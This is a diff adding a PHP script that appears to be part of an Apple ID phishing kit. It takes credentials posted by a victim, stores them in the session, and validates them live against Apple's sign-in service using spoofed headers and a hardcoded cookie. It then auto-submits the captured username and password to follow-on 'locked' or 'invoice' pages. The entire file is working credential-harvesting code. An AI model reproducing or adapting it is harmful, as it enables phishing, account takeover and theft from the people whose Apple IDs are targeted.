@@ -1,0 +1,81 @@
+<?php
+error_reporting(0);
+error_reporting(E_ERROR);
+require "functions.php";
+require "../../lang.php";
+require "../../config.php";
+require "simplehtmldom.php";
+
+$_SESSION['user'] = $_POST['user'];
+$_SESSION['pass'] = $_POST['pass'];
+
+function login($url,$user,$password){
+$fp = fopen("cookie.txt", "w");
+fclose($fp);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
+curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"accountName":"'.$user.'","password":"'.$password.'","rememberMe":false}');
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+
+$headers = array();
+$headers[] = "Host: idmsa.apple.com";
+$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
+$headers[] = "Accept: application/json, text/javascript, */*; q=0.01";
+$headers[] = "Accept-Language: en-US,en;q=0.5";
+$headers[] = "Referer: https://idmsa.apple.com/appleauth/auth/signin?widgetKey=65cf91973b413a70631c3e4d2e682494&language=en_US";
+$headers[] = "Content-Type: application/json";
+$headers[] = "X-Apple-Widget-Key: 65cf91973b413a70631c3e4d2e682494";
+$headers[] = "X-Apple-I-Fd-Client-Info: {\"U\"\":\"\"Mozilla/5.0";
+$headers[] = "X-Apple-Locale: en_US";
+$headers[] = "X-Requested-With: XMLHttpRequest";
+$headers[] = "Cookie: s_vi=[CS]v1|2CFF4972850311C2-60001183E000606C[CE]; as_dc=nwk; dssf=1; dssid2=46bdfe05-af3f-458f-a75e-b8da0c162378; as_pcts=nShAgwM4YjAw7vS8Y1J-t_aOuLFaaW3+-u05pWi+1CCWikia90im6ctTZc6U4Ua; as_sfa=Mnx1c3x1c3x8ZW5fVVN8Y29uc3VtZXJ8aW50ZXJuZXR8MHwwfDE=; optimizelyEndUserId=oeu1514952128951r0.5497066321506434; optimizelySegments=%\"7B\"%\"22341793217\"%\"22\"%\"3A\"%\"22search\"%\"22\"%\"2C\"%\"22341794206\"%\"22\"%\"3A\"%\"22false\"%\"22\"%\"2C\"%\"22341824156\"%\"22\"%\"3A\"%\"22ff\"%\"22\"%\"2C\"%\"22341932127\"%\"22\"%\"3A\"%\"22none\"%\"22\"%\"7D;";
+$headers[] = "Connection: keep-alive";
+$headers[] = "Pragma: no-cache";
+$headers[] = "Cache-Control: no-cache";
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+ob_start();
+return curl_exec ($ch);
+ob_end_clean();
+curl_close ($ch);
+unset($ch);    
+
+}
+
+$statlog = login("https://idmsa.apple.com/appleauth/auth/signin", $_POST['user'], $_POST['pass']);
+$cek = json_decode($statlog);
+$true = $cek->authType;
+if ($true == "sa" or $true == "hsa" or $true == "hsa2")  { ?>
+<?php if ($typelogin == "locked" ) { ?>
+ <form action="../locked.php" name="frm" method="POST">
+     <input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
+    <input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
+      <script language="JavaScript"> 
+      document.frm.submit();
+      </script>
+  </form>
+<?php } else if ($typelogin == "invoice" ) { ?>
+<input type="hidden" value="" name="user">
+ <form action="../invoice.php" name="frm" method="POST">
+      <input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
+      <input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
+      <script language="JavaScript"> 
+      document.frm.submit();
+      </script>
+  </form>
+<?php }} else { ?> 
+  <form action="../failed.php" name="frm">
+      <input type="hidden" value="" name="user">
+      <input type="hidden" value="" name="pass">
+      <script language="JavaScript"> 
+      document.frm.submit();
+      </script>
+  </form>
+<?php } ?>
